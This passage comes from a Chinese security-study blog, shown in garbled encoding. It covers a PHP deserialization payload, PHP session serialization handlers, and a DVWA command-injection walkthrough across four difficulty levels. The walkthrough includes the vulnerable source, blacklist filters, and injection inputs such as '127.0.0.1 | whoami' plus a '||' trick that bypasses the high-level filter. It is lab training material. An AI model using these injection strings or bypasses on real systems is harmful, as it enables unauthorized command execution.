å¾—åˆ°payloadï¼šO:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h2 id="sessionååºåˆ—åŒ–æ¼æ´"><a href="#sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionååºåˆ—åŒ–æ¼æ´"></a>sessionååºåˆ—åŒ–æ¼æ´</h2><h3 id="PHPçš„sessionæœºåˆ¶"><a href="#PHPçš„sessionæœºåˆ¶" class="headerlink" title="PHPçš„sessionæœºåˆ¶"></a>PHPçš„sessionæœºåˆ¶</h3><p>ç›¸å…³å‚æ•°åŠå«ä¹‰ï¼ˆå¯ä»¥åœ¨php.iniä¸­çœ‹åˆ°</p>
<p><a href="https://xz.aliyun.com/t/6640">æ›´å¤šæœ‰å…³php.iniçš„é…ç½®</a></p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>session.save_handler</td>
<td>sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles</td>
</tr>
<tr>
<td>session.save_path</td>
<td>sessionä¿å­˜è·¯å¾„ã€‚</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphpã€‚</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚</td>
</tr>
<tr>
<td>session.auto_start</td>
<td>æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤false</td>
</tr>
</tbody></table>
<p>å­˜å‚¨æœºåˆ¶</p>
<p>phpä¸­çš„sessionå†…å®¹æ˜¯ä»¥<strong>æ–‡ä»¶</strong>æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±<code>session.save_handler</code>æ¥å†³å®šã€‚æ–‡ä»¶åç”±<code>sess_sessionid</code>å‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸ºsessionåºåˆ—åŒ–åçš„å€¼</p>
<p>å…ˆé€šè¿‡ä¸€ä¸ªæ ·ä¾‹ä»£ç ï¼Œçœ‹çœ‹3ç§ä¸åŒçš„ <strong>session</strong> åºåˆ—åŒ–å¤„ç†å™¨å¤„ç† <strong>session</strong> çš„æƒ…å†µã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;T0mr&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®php.inié»˜è®¤çš„sessionå­˜å‚¨ä½ç½®æ‰¾åˆ°äº†sessionæ–‡ä»¶å†…å®¹ä¸ºï¼š <code>name|s:4:&quot;T0mr&quot;;</code></p>
<p>å½“ <strong>session.serialize_handler=php_serialize</strong> æ—¶ï¼Œsessionæ–‡ä»¶ä¸ºï¼š <code>a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;T0mr&quot;;&#125;</code></p>
<p>å½“ <strong>session.serialize_handler=php_binary</strong> æ—¶ï¼Œsessionæ–‡ä»¶å†…å®¹ä¸ºï¼š <code>&lt;0x04&gt;names:4:&quot;T0mr&quot;;</code></p>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize(php&gt;5.5.4)</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody></table>
<p>PHPåœ¨sessionå­˜å‚¨å’Œè¯»å–æ—¶,éƒ½ä¼šæœ‰ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ŒPHPå†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å– $_SESSION æ•°æ®ï¼Œéƒ½ä¼šå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–.</p>
]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œæ¼æ´å­¦ä¹ ç¬”è®°</title>
    <url>/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æŒ‡åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚ï¼šsystem()ã€exec()ã€shell_exec()ã€eval()ã€passthru()ï¼Œä»£ç æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°åšè¿‡æ»¤ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p>
<p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œâ€œ&amp; ã€&amp;&amp; ã€| ã€ ||â€éƒ½å¯ä»¥ä½œä¸ºå‘½ä»¤è¿æ¥ç¬¦ä½¿ç”¨ï¼Œç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ .</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">command1;command2 : å…ˆæ‰§è¡Œcommand1å†æ‰§è¡Œcommand2</span><br><span class="line">command1 &amp; command2 ï¼šä¸ç®¡command1æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šæ‰§è¡Œcommand2ï¼ˆå°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ï¼‰</span><br><span class="line">command1 &amp;&amp; command2 ï¼šå…ˆæ‰§è¡Œcommand1æ‰§è¡ŒæˆåŠŸåæ‰ä¼šæ‰§è¡Œcommand2</span><br><span class="line">command1 | command2 ï¼šåªæ‰§è¡Œcommand2</span><br><span class="line">command1 || command2 ï¼šcommand1æ‰§è¡Œå¤±è´¥ï¼Œå†æ‰§è¡Œcommand2(è‹¥command1æ‰§è¡ŒæˆåŠŸï¼Œå°±ä¸å†æ‰§è¡Œcommand2)</span><br></pre></td></tr></table></figure>

<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="åŸºäºdvwaè¿›è¡Œå­¦ä¹ "><a href="#åŸºäºdvwaè¿›è¡Œå­¦ä¹ " class="headerlink" title="åŸºäºdvwaè¿›è¡Œå­¦ä¹ "></a>åŸºäºdvwaè¿›è¡Œå­¦ä¹ </h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç”±æºç å¯çŸ¥ï¼Œå¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¿‡æ»¤ï¼Œä»…ä»…æ˜¯åˆ¤æ–­äº†ä¸€ä¸‹æ˜¯ä¸æ˜¯Windows NT<br>æäº¤ â€œ127.0.0.1 | ipconfigâ€ å¯ä»¥å¾—åˆ°ç›®æ ‡çš„æ‰€æœ‰IPä¿¡æ¯.<br>æäº¤ â€œ127.0.0.1 | whoamiâ€ å¯ä»¥å¾—åˆ°ç›®æ ‡çš„ç”¨æˆ·ä¿¡æ¯.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æœ‰å…³å‡½æ•°å¦‚ä¸‹ğŸ‘‡</span><br><span class="line">stristr(<span class="keyword">string</span>,search,before_search)</span><br><span class="line">æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»åŒ¹é…ç‚¹ï¼‰ï¼Œå¦‚æœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› <span class="literal">FALSE</span></span><br><span class="line"></span><br><span class="line">è¯¥å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå¦‚éœ€è¿›è¡ŒåŒºåˆ†å¤§å°å†™çš„æœç´¢ï¼Œè¯·ä½¿ç”¨ strstr() å‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">php_uname (<span class="variable">$mode</span>)</span><br><span class="line">è¿”å›è¿è¡Œ PHP çš„ç³»ç»Ÿçš„æœ‰å…³ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¿”å›è¿è¡Œ PHP çš„æ“ä½œç³»ç»Ÿçš„æè¿°</span><br><span class="line"><span class="variable">$mode</span> æ˜¯å•ä¸ªå­—ç¬¦ï¼Œç”¨äºå®šä¹‰è¦è¿”å›ä»€ä¹ˆä¿¡æ¯ï¼š</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>ï¼šæ­¤ä¸ºé»˜è®¤ã€‚åŒ…å«åºåˆ— <span class="string">&quot;s n r v m&quot;</span> é‡Œçš„æ‰€æœ‰æ¨¡å¼ã€‚</span><br><span class="line"><span class="string">&#x27;s&#x27;</span>ï¼šæ“ä½œç³»ç»Ÿåç§°ã€‚ä¾‹å¦‚ï¼š FreeBSDã€‚</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>ï¼šä¸»æœºåã€‚ä¾‹å¦‚ï¼š localhost.example.comã€‚</span><br><span class="line"><span class="string">&#x27;r&#x27;</span>ï¼šç‰ˆæœ¬åç§°ï¼Œä¾‹å¦‚ï¼š <span class="number">5.1</span>.<span class="number">2</span>-RELEASEã€‚</span><br><span class="line"><span class="string">&#x27;v&#x27;</span>ï¼šç‰ˆæœ¬ä¿¡æ¯ã€‚æ“ä½œç³»ç»Ÿä¹‹é—´æœ‰å¾ˆå¤§çš„ä¸åŒã€‚</span><br><span class="line"><span class="string">&#x27;m&#x27;</span>ï¼šæœºå™¨ç±»å‹ã€‚ä¾‹å¦‚ï¼ši386ã€‚</span><br></pre></td></tr></table></figure>

<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><font color=#999AAA >ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸éš¾å‘ç°åªè¿‡æ»¤äº†&amp;&amp;å’Œ;<br>é‚£æˆ‘ä»¬ä¸ç”¨è¿™ä¸¤ä¸ªå°±å¯ä»¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç›¸å…³å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">str_replace(find,replace,<span class="keyword">string</span>,count)</span><br><span class="line">ä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼</span><br><span class="line">replace å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼</span><br><span class="line"><span class="keyword">string</span> å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²</span><br><span class="line">count å¯é€‰ã€‚å¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°çš„å˜é‡</span><br><span class="line">è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š</span><br><span class="line">å¦‚æœæ›¿æ¢å’Œæ›¿æ¢ç›®æ ‡éƒ½æ˜¯æ•°ç»„ï¼Œä¸”éœ€è¦æ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ ï¼Œé‚£ä¹ˆå¤šä½™å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢</span><br><span class="line">å¦‚æœæ›¿æ¢çš„ç›®æ ‡æ˜¯æ•°ç»„ï¼Œè€Œæ›¿æ¢çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨</span><br><span class="line">æ³¨é‡Šï¼šè¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ã€‚è¯·ä½¿ç”¨ str_ireplace() å‡½æ•°æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æœç´¢</span><br><span class="line">æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„</span><br><span class="line"></span><br><span class="line">array_keys(<span class="keyword">array</span>,value,strict)</span><br><span class="line">è¿”å›åŒ…å«æ•°ç»„ä¸­æ‰€æœ‰é”®åçš„ä¸€ä¸ªæ–°æ•°ç»„</span><br><span class="line"><span class="keyword">array</span> å¿…éœ€ã€‚è§„å®šæ•°ç»„</span><br><span class="line">value å¯é€‰ã€‚æ‚¨å¯ä»¥æŒ‡å®šé”®å€¼ï¼Œç„¶ååªæœ‰è¯¥é”®å€¼å¯¹åº”çš„é”®åä¼šè¢«è¿”å›</span><br><span class="line">strict å¯é€‰ã€‚ä¸ value å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚å¯èƒ½çš„å€¼ï¼š</span><br><span class="line"><span class="literal">true</span> - è¿”å›å¸¦æœ‰æŒ‡å®šé”®å€¼çš„é”®åã€‚ä¾èµ–ç±»å‹ï¼Œæ•°å­— <span class="number">5</span> ä¸å­—ç¬¦ä¸² â€œ<span class="number">5</span>â€ æ˜¯ä¸åŒçš„</span><br><span class="line"><span class="literal">false</span> - é»˜è®¤å€¼ã€‚ä¸ä¾èµ–ç±»å‹ï¼Œæ•°å­— <span class="number">5</span> ä¸å­—ç¬¦ä¸² â€œ<span class="number">5</span>â€ æ˜¯ç›¸åŒçš„</span><br><span class="line">å¦‚æœæä¾›äº†ç¬¬äºŒä¸ªå‚æ•°ï¼Œåˆ™åªè¿”å›é”®å€¼ä¸ºè¯¥å€¼çš„é”®å</span><br><span class="line">å¦‚æœ strict å‚æ•°æŒ‡å®šä¸º <span class="literal">true</span>ï¼Œåˆ™ PHP ä¼šä½¿ç”¨å…¨ç­‰æ¯”è¾ƒ (===) æ¥ä¸¥æ ¼æ£€æŸ¥é”®å€¼çš„æ•°æ®ç±»å‹</span><br></pre></td></tr></table></figure>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p><font color=#999AAA >ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç»†å¿ƒç‚¹å¯ä»¥å‘ç°è¿‡æ»¤çš„â€™|â€™ä¸­å¤šäº†ä¸€ä¸ªç©ºæ ¼ï¼ˆå†™æˆäº†â€™| â€˜ï¼‰é‚£ä¹ˆç”¨|å°±å¯ä»¥ç»•è¿‡<br>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸ªå¥½ç©çš„å°±æ˜¯å¯ä»¥åˆ©ç”¨è¿‡æ»¤çš„é¡ºåºæ¥ç»•è¿‡<br>ä¹Ÿå°±æ˜¯ 127.0.0.1|| ipconfig<br>åœ¨||åå¤šä¸ªç©ºæ ¼ï¼Œä¼šå…ˆåŒ¹é…åˆ°â€™| â€˜ï¼Œè¿™æ ·ä¹‹åå°±ç­‰ä»·äº127.0.0.1|ipconfig</p>
<p>highéš¾åº¦çš„è¿‡æ»¤è¾ƒä¸ºå…¨é¢ä½†æ˜¯ä»æœ‰æ¼æ´</p>
<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›¸å…³å‡½æ•°ä»‹ç»<br>stripslashes(string)<br>stripslasheså‡½æ•°ä¼šåˆ é™¤å­—ç¬¦ä¸²stringä¸­çš„åæ–œæ ï¼Œè¿”å›å·²å‰¥ç¦»åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p>
